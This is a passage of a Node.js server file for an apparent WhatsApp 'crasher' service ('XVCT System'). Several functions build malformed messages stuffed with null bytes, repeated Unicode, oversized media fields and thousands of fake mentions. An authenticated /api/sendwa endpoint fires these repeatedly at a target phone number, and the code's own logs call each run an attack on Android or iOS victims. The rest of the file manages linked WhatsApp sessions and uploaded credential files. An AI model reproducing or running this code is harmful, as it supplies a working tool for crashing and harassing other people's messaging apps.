                text: "᭯".repeat(999),
                matchedText: "https://" + "ꦾ".repeat(200) + ".com/" + "ꦾ".repeat(999),
                canonicalUrl: "https://" + "ꦾ".repeat(200) + ".com/" + "ꦾ".repeat(999),
               description: "\u0000".repeat(999),
                title: "\u0000".repeat(999),
                previewType: "NONE",
                jpegThumbnail: Buffer.alloc(10000), 
         contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
         externalAdReply: {
                showAdAttribution: true,
                title: "\u0000".repeat(999),
                body: "\u0000".repeat(999),
                thumbnailUrl: "https://" + "ꦾ".repeat(200) + ".com/" + "ꦾ".repeat(999),
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://" + "ꦾ".repeat(200) + ".com/" + "ꦾ".repeat(999)
            },
            mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
        }
    },
         paymentInviteMessage: {
                currencyCodeIso4217: "USD",
                amount1000: 999999999,
                expiryTimestamp: null,
                inviteMessage: "\u0000".repeat(999),
                serviceType: 1
            }
        },
            isSampled: true,
            mentionedJid: [
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )]
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "1@newsletter",
            serverMessageId: 1,
            newsletterName: `RaldzzXyz || Crasher`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function DelayHard(sock, target) {
    const stickerMsg = {
  message: {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
      mimetype: "image/webp",
      fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
      fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
      mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
      fileLength: 1173741,
      mediaKeyTimestamp: Date.now(),
      isAnimated: false,
      directPath: "/v/t62.7118-24/sample_sticker.enc",
      contextInfo: {
        mentionedJid: [
          target,
          ...Array.from({ length: 50 }, () =>
            "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
        ],
        participant: target,
        remoteJid: "status@broadcast",
      },
    },
  },
};

const msg = generateWAMessageFromContent(target, stickerMsg.message, {});

await sock.relayMessage("status@broadcast", msg.message, {
  messageId: msg.key.id,
  statusJidList: [target],
  additionalNodes: [
    {
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: { jid: target },
              content: []
            },
          ],
        },
      ],
    },
  ],
});

console.log("✅ Sticker berhasil dikirim tanpa error.");
}

async function puqimak969(sock, target) {
  const Images = {
    viewOnceMessage: {
      message: {
        audioMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
          mimetype: "audio/mpeg",
          fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145, 0, 70, 137, 73, 190, 145, 0, 44,
            165, 102, 153, 233, 111, 114, 69, 10, 55, 61, 186, 131, 245, 153, 93, 211
          ]),
          fileLength: 432722,
          seconds: 26,
          ptt: false,
          mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254, 75, 254, 190, 229, 25, 16, 78, 48, 98, 117,
            42, 71, 65, 199, 10, 164, 16, 57, 189, 229, 54, 93, 69, 6, 212, 145
          ]),
          fileEncSha256: Buffer.from([
            29, 27, 247, 158, 114, 50, 140, 73, 40, 108, 77, 206, 2, 12, 84, 131,
            54, 42, 63, 11, 46, 208, 136, 131, 224, 87, 18, 220, 254, 211, 83, 153
          ]),
          directPath:
            "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1746275400,
          contextInfo: {
            mentionedJid: Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },

        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: undefined,
              type: 25,
            },
          },
        },

        albumMessage: {
          items: [
            {
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
                fileLength: "99999999",
                height: 9999,
                width: 9999,
                mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
                directPath:
                  "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1755254367",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k=",
                caption: "\u0000",
              },
            },
          ],

          contextInfo: {
            mentionedJid: [
              "928833219@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            remoteJid: "X",
            participant: target,
            stanzaId: "1234567890ABCDEF",

            eventCoverImage: {
              eventId: Date.now() + 1814400000,
              eventName: "",
              eventDescription: "ꦽ".repeat(20000),
              startTime: 9999999999,
              endTime: 99999999999,

              eventCoverMedia: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileLength: "9999999999999",
                height: 9999,
                width: 9999,
                caption: "ោ៝".repeat(20000),
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k=",
              },

              eventLocation: {
                name: "",
                address: "ោ៝".repeat(20000),
                degreesLatitude: -922.99999999,
                degreesLongitude: 922.999999999999,
                url: "https://t.me/LuciferNotDev",
              },

              eventParticipants: {
                participants: [
                  { jid: target, displayName: "Participant" }
                ],
              },

              eventStatus: "@META AI",

              eventOptions: {
                isAnonymous: true,
                canGuestsInvite: true,
                canSeeGuestList: true,
                maxParticipants: 9999999999,
                requiresApproval: false,
                customField1: "cilub",
                customField2: "ba!!!",
              },

              eventMetadata: JSON.stringify({
                heavy_data: "ACCOUNTS",
                nested: {
                  level1: "X".repeat(546),
                  level2: {
                    level3: "X".repeat(546),
                    level4: {
                      level5: "X".repeat(546),
                      array_data: Array(100)
                        .fill()
                        .map(() => ({
                          item: "9.999$",
                          details: "X",
                        }))
                    }
                  }
                }
              }),

              binaryData: "\u0081".repeat(0x7000),
            },
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, unifiedMessage, {});

  unifiedMessage.viewOnceMessage.message.statusMentionMessage.message.protocolMessage.key = msg.key;

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target],
    }
  );
  
  await sock.relayMessage(
    target,
    unifiedMessage.viewOnceMessage.message.statusMentionMessage,
    {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "#𝐁𝐞𝐭𝐚 - 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥" },
          content: undefined,
        },
      ],
    }
  );
}

// Session Management
async function startSession(sessionId) {
    const sessionPath = path.join('sessions', sessionId)
    
    if (!fs.existsSync(sessionPath)) {
        fs.mkdirSync(sessionPath, { recursive: true })
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
    
    const sock = makeWASocket({
        logger: pino({ level: "silent" }),
        auth: {
            creds: state.creds,
            keys: state.keys,
        },
        browser: Browsers.ubuntu('Chrome'),
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: false,
        getMessage: async (key) => {
            return { conversation: 'XVCT System' }
        },
        defaultQueryTimeoutMs: undefined,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        connectTimeoutMs: 60000,
        qrTimeout: 60000
    })

    activeSessions[sessionId] = sock
    
    if (!sessionStats[sessionId]) {
        sessionStats[sessionId] = { sent: 0, received: 0, created: Date.now(), reconnectCount: 0 }
    }

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update
        
        if (qr) {
            console.log(`[${sessionId}] QR Code received (use pairing code instead)`)
        }
        
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode
            console.log(`[${sessionId}] Connection closed. Reason: ${reason}`)
            
            const shouldReconnect = reason !== DisconnectReason.loggedOut
            
            if (shouldReconnect) {
                const reconnectCount = sessionStats[sessionId].reconnectCount || 0
                
                if (reconnectCount < 10) {
                    console.log(`[${sessionId}] Reconnecting... (${reconnectCount + 1}/10)`)
                    sessionStats[sessionId].reconnectCount = reconnectCount + 1
                    
                    setTimeout(() => {
                        if (fs.existsSync(sessionPath)) {
                            startSession(sessionId)
                        }
                    }, 5000)
                } else {
                    console.log(`[${sessionId}] Max reconnect attempts reached. Stopping.`)
                    delete activeSessions[sessionId]
                }
            } else {
                console.log(`[${sessionId}] Logged out. Removing session...`)
                delete activeSessions[sessionId]
                delete sessionStats[sessionId]
                
                setTimeout(() => {
                    rmDir(sessionPath)
                }, 2000)
            }
        } else if (connection === 'open') {
            console.log(`[${sessionId}] ✅ Connected successfully`)
            if (sessionStats[sessionId]) {
                sessionStats[sessionId].reconnectCount = 0
            }
        } else if (connection === 'connecting') {
            console.log(`[${sessionId}] 🔄 Connecting...`)
        }
    })

    sock.ev.on('messages.upsert', ({ messages }) => {
        if (sessionStats[sessionId]) {
            sessionStats[sessionId].received += messages.length
        }
    })

    sock.ev.on('creds.update', saveCreds)
    
    sock.ev.on('messages.update', () => {})
    sock.ev.on('message-receipt.update', () => {})
    sock.ev.on('presence.update', () => {})
    
    return sock
}

const initSessions = () => {
    if (!fs.existsSync('sessions')) fs.mkdirSync('sessions')
    const sessions = fs.readdirSync('sessions')
    console.log(`🔄 Found ${sessions.length} existing session(s)`)
    
    let validSessions = 0
    for (let id of sessions) {
        const sessionPath = path.join('sessions', id)
        if(id !== '.DS_Store' && fs.statSync(sessionPath).isDirectory()) {
            const credsPath = path.join(sessionPath, 'creds.json')
            if (fs.existsSync(credsPath)) {
                try {
                    const creds = JSON.parse(fs.readFileSync(credsPath, 'utf8'))
                    if (creds.me?.id) {
                        console.log(`📱 Loading session: ${id}`)
                        setTimeout(() => startSession(id), validSessions * 2000)
                        validSessions++
                    } else {
                        console.log(`⚠️  Invalid session ${id}, skipping`)
                    }
                } catch (e) {
                    console.log(`❌ Error loading session ${id}:`, e.message)
                }
            } else {
                console.log(`⚠️  No creds.json in ${id}, removing...`)
                rmDir(sessionPath)
            }
        }
    }
    console.log(`✅ ${validSessions} valid session(s) will be initialized`)
}

// Middleware
const checkAuth = (req, res, next) => {
    if (req.session.user) {
        next()
    } else {
        res.status(403).json({ success: false, message: "Unauthorized" })
    }
}

const checkSystemStatus = (req, res, next) => {
    if (!systemStatus.online || systemStatus.maintenance) {
        return res.status(503).json({ 
            success: false, 
            maintenance: true,
            message: systemStatus.message || 'System maintenance' 
        })
    }
    next()
}

// API Routes
app.get('/api/system-status', (req, res) => {
    res.json(systemStatus)
})

app.post('/api/login', checkSystemStatus, (req, res) => {
    const { username, password } = req.body
    const users = loadUsers()
    const user = users.find(u => u.username === username && u.password === password)
    
    if (user) {
        req.session.user = user
        console.log(`User logged in: ${username}`)
        res.json({ success: true, role: user.role })
    } else {
        res.json({ success: false, message: 'Invalid credentials' })
    }
})

app.post('/api/logout', (req, res) => {
    const username = req.session.user?.username
    req.session.destroy()
    console.log(`User logged out: ${username}`)
    res.json({ success: true })
})

app.get('/api/me', (req, res) => {
    res.json({ loggedIn: !!req.session.user, user: req.session.user })
})

app.get('/api/senders', checkAuth, checkSystemStatus, (req, res) => {
    const list = Object.keys(activeSessions).map(id => ({
        id,
        status: activeSessions[id]?.user ? 'Connected' : 'Connecting',
        number: id,
        stats: sessionStats[id] || { sent: 0, received: 0 }
    }))
    res.json({ success: true, data: list })
})

app.post('/api/create-session', checkAuth, checkSystemStatus, async (req, res) => {
    let { number } = req.body
    if (!number) return res.json({ success: false, message: "Number required" })
    
    number = number.replace(/[^0-9]/g, '')
    if (number.startsWith('0')) number = '62' + number.slice(1)
    
    if (activeSessions[number]) {
        return res.json({ success: false, message: "Session already exists" })
    }

    try {
        console.log(`Creating session for: ${number}`)
        const sock = await startSession(number)
        
        let attempts = 0
        const maxAttempts = 15
        
        const checkAndGenerateCode = async () => {
            attempts++
            
            if (!sock.authState?.creds) {
                if (attempts < maxAttempts) {
                    setTimeout(checkAndGenerateCode, 1000)
                    return
                } else {
                    return res.json({ success: false, message: "Timeout waiting for session initialization" })
                }
            }
            
            if (!sock.authState.creds.registered) {
                try {
                    let code = await sock.requestPairingCode(number)
                    code = code?.match(/.{1,4}/g)?.join("-") || code
                    console.log(`✅ Pairing code generated: ${code}`)
                    res.json({ success: true, code, message: "Pairing code generated" })
                } catch (err) {
                    console.error(`❌ Error generating code:`, err.message)
                    res.json({ success: false, message: err.message })
                }
            } else {
                console.log(`⚠️  Number already registered`)
                res.json({ success: false, message: "Number already registered" })
            }
        }
        
        setTimeout(checkAndGenerateCode, 2000)
        
    } catch (e) {
        console.error(`❌ Error creating session:`, e.message)
        res.json({ success: false, message: e.message })
    }
})

app.post('/api/upload-session', checkAuth, checkSystemStatus, upload.single('sessionFile'), async (req, res) => {
    if (!req.file) return res.json({ success: false, message: "No file uploaded" })

    const tempPath = req.file.path
    const extractPath = path.join('temp', 'ext-' + Date.now())

    try {
        fs.mkdirSync(extractPath, { recursive: true })

        if (req.file.originalname.toLowerCase().endsWith('.zip')) {
            const zip = new AdmZip(tempPath)
            zip.extractAllTo(extractPath, true)
        } else if (req.file.originalname.toLowerCase().endsWith('.json')) {
            fs.copyFileSync(tempPath, path.join(extractPath, 'creds.json'))
        } else {
            throw new Error("Invalid file format. Use .zip or .json")
        }

        const findCreds = (dir) => {
            const files = fs.readdirSync(dir, { withFileTypes: true })
            for (const file of files) {
                const fullPath = path.join(dir, file.name)
                if (file.isDirectory()) {
                    const found = findCreds(fullPath)
                    if (found) return found
                } else if (file.name === 'creds.json') {
                    return fullPath
                }
            }
            return null
        }

        const credsFile = findCreds(extractPath)
        if (!credsFile) throw new Error("creds.json not found in uploaded file")

        const credsContent = JSON.parse(fs.readFileSync(credsFile, 'utf8'))
        const botNumber = credsContent?.me?.id?.split(":")[0]
        if (!botNumber) throw new Error("Invalid session data")

        const destDir = path.join('sessions', botNumber)
        rmDir(destDir)
        fs.mkdirSync(destDir, { recursive: true })

        const sourceDir = path.dirname(credsFile)
        fs.readdirSync(sourceDir).forEach(f => {
            fs.copyFileSync(path.join(sourceDir, f), path.join(destDir, f))
        })

        await startSession(botNumber)
        fs.unlinkSync(tempPath)
        rmDir(extractPath)

        console.log(`Session restored: ${botNumber}`)
        res.json({ success: true, message: `Session restored: ${botNumber}` })
    } catch (err) {
        console.error('Upload error:', err)
        if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath)
        if (fs.existsSync(extractPath)) rmDir(extractPath)
        res.json({ success: false, message: err.message })
    }
})

app.post('/api/sendwa', checkAuth, checkSystemStatus, async (req, res) => {
    const { sender, target, type, count = 1 } = req.body

    if (!activeSessions[sender]) {
        return res.json({ success: false, message: "Sender offline" })
    }

    const sock = activeSessions[sender]
    
    if (!sock.user) {
        return res.json({ success: false, message: "Session not ready. Please wait or reconnect." })
    }
    
    let number = target.replace(/[^0-9]/g, '')
    if (number.startsWith('0')) number = '62' + number.slice(1)
    const jid = number + "@s.whatsapp.net"

    try {
        console.log(`⚡ Attack: ${sender} -> ${jid} (${type} x${count})`)
        
        for (let i = 0; i < count; i++) {
            if (type === 'android') {
                await LoraaTLID(sock, jid);
                await sleep(300)
                await blabla(sock, jid)
                await sleep(300)
                await XProtexDelayHard(sock, jid, true);
                await sleep(300)
                await protocolbug7(sock, jid, true);
                await sleep(300)
                await VxGSarzAhah(sock, jid);
                await sleep(500)
            } else if (type === 'ios') {
                await iosinVis(sock, jid);
                await sleep(500);
                await puqimak969(sock, jid);
                await DelayHard(sock, jid);
            }
            await sleep(500)
            
            if (sessionStats[sender]) {
                sessionStats[sender].sent++
            }
        }

        systemStatus.totalAttacks += count
        saveSystemStatus()
        
        console.log(`✅ Attack completed: ${count}x ${type} to ${jid}`)
        res.json({ success: true, message: `Sent ${count}x ${type} attacks via ${sender}` })
    } catch (e) {
        console.error('❌ Attack error:', e.message)
        res.json({ success: false, message: e.message })
    }
})

app.delete('/api/delete-session/:sessionId', checkAuth, checkSystemStatus, async (req, res) => {
    const { sessionId } = req.params
    
    try {
        if (activeSessions[sessionId]) {
            await activeSessions[sessionId].logout()
            delete activeSessions[sessionId]
        }
        
        delete sessionStats[sessionId]
        
        const sessionPath = path.join('sessions', sessionId)
        if (fs.existsSync(sessionPath)) {
            rmDir(sessionPath)
        }
        
        console.log(`🗑️  Session deleted: ${sessionId}`)
        res.json({ success: true, message: `Session ${sessionId} deleted` })
    } catch (e) {
        console.error('❌ Delete error:', e.message)
        res.json({ success: false, message: e.message })
    }
})

// Health Check
app.get('/health', (req, res) => {
    res.json({
        status: systemStatus.online ? 'online' : 'offline',
        maintenance: systemStatus.maintenance,
        uptime: Math.floor((Date.now() - systemStatus.startTime) / 1000),
        sessions: Object.keys(activeSessions).length,
        version: '2.5'
    })
})

// System Control (Admin only)
app.post('/api/system/shutdown', checkAuth, (req, res) => {
    if (req.session.user.role !== 'admin') {
        return res.status(403).json({ success: false, message: 'Admin only' })
    }
    
    systemStatus.online = false
    systemStatus.message = 'System shutdown by admin'
    saveSystemStatus()
    
    console.log('🔴 System shutdown by:', req.session.user.username)
    res.json({ success: true, message: 'System shutdown' })
})

app.post('/api/system/startup', checkAuth, (req, res) => {
    if (req.session.user.role !== 'admin') {
        return res.status(403).json({ success: false, message: 'Admin only' })
    }
    
    systemStatus.online = true
    systemStatus.maintenance = false
    systemStatus.message = ''
    saveSystemStatus()
    
    console.log('🟢 System startup by:', req.session.user.username)
    res.json({ success: true, message: 'System is now online' })
})

app.post('/api/system/maintenance', checkAuth, (req, res) => {
    if (req.session.user.role !== 'admin') {
        return res.status(403).json({ success: false, message: 'Admin only' })
    }
    
    systemStatus.maintenance = !systemStatus.maintenance
    systemStatus.message = systemStatus.maintenance ? 'System under maintenance' : ''
    saveSystemStatus()
    
    console.log('🔧 Maintenance mode:', systemStatus.maintenance, 'by:', req.session.user.username)
    res.json({ 
        success: true, 
        maintenance: systemStatus.maintenance,
        message: systemStatus.maintenance ? 'Maintenance enabled' : 'Maintenance disabled' 
    })
})

app.get('/api/fakeiphone', checkAuth, checkSystemStatus, async (req, res) => {
    const text = req.query.text;
    if (!text) return res.json({ success: false, message: "Parameter 'text' required" });

    try {
        const url = `https://brat.siputzx.my.id/iphone-quoted?time=12.00&batteryPercentage=90&carrierName=AXIS&messageText=${encodeURIComponent(text)}&emojiStyle=apple`;
        
        res.redirect(url);
        
        // Kalau mau return JSON URL:
        // res.json({ success: true, url: url });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

app.get('/api/yts', checkAuth, checkSystemStatus, async (req, res) => {
    const query = req.query.query;
    if (!query) return res.json({ success: false, message: "Parameter 'query' required" });

    try {
        const response = await fetch(`https://api.yupra.my.id/api/search/youtube?q=${encodeURIComponent(query)}`);
        const json = await response.json();

        if (!json.status || !json.results?.length) {
            return res.json({ success: false, message: "Tidak ada hasil" });
        }

        res.json({ success: true, data: json.results.slice(0, 5) });
    } catch (e) {
        res.json({ success: false, message: "Error fetching data" });
    }
});

app.get('/api/gsmarena', checkAuth, checkSystemStatus, async (req, res) => {
    const query = req.query.query;
    if (!query) return res.json({ success: false, message: "Parameter 'query' required" });

    try {
        const url = `https://api.zenzxz.my.id/api/search/gsmarena?query=${encodeURIComponent(query)}`;
        const response = await fetch(url);
        const json = await response.json();

        if (!json?.success) {
            return res.json({ success: false, message: "Data tidak ditemukan" });
        }

        res.json({ success: true, data: json.data });
    } catch (e) {
        res.json({ success: false, message: "Error fetching data" });
    }
});


app.get('/api/sunda', checkAuth, checkSystemStatus, async (req, res) => {
    const text = req.query.text;
    if (!text) return res.json({ success: false, message: "Parameter 'text' required" });

    try {
        const body = new URLSearchParams({
            from_lang: 'id_ID',
            to: 'su_ID',
            text: text,
            platform: 'dp'
        }).toString();

        const headers = {
            'Host': 'lingvanex.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://lingvanex.com',
            'Referer': 'https://lingvanex.com/translation/indonesia-ke-bahasa-sunda'
        };

        const request = await fetch('https://lingvanex.com/translation/translate', {
            method: 'POST',
            headers,
            body
        });

        const json = await request.json();
        if (!json || json.err) {
            return res.json({ success: false, message: "Gagal translate" });
        }

        res.json({ success: true, result: json.result });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});



// Error Handler
app.use((err, req, res, next) => {
    console.error('Error:', err)
    res.status(500).json({ success: false, message: 'Internal server error' })
})

// Initialize and Start
initSessions()

app.listen(PORT, () => {
    console.log(`
╔═══════════════════════════════════════╗
║        XVCT SYSTEM V2.5               ║
║      Enhanced Backend Server          ║
╠═══════════════════════════════════════╣
║  🚀 Server: http://localhost:${PORT}    ║
║  🤖 Telegram Bot: ${bot ? 'Active' : 'Disabled'}          ║
║  📱 Sessions: ${Object.keys(activeSessions).length} loaded              ║
║  ✅ Status: Online                    ║
╚═══════════════════════════════════════╝
    `)
    
    if (bot) {
        console.log('💬 Telegram bot is running')
    } else {
        console.log('⚠️  Telegram bot disabled (set TELEGRAM_BOT_TOKEN)')
    }
})

// Graceful Shutdown
process.on('SIGINT', () => {
    console.log('\n🔴 Shutting down gracefully...')
    systemStatus.online = false
    saveSystemStatus()
    process.exit(0)
})

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err)
})

process.on('unhandledRejection', (err) => {
    console.error('Unhandled Rejection:', err)
})
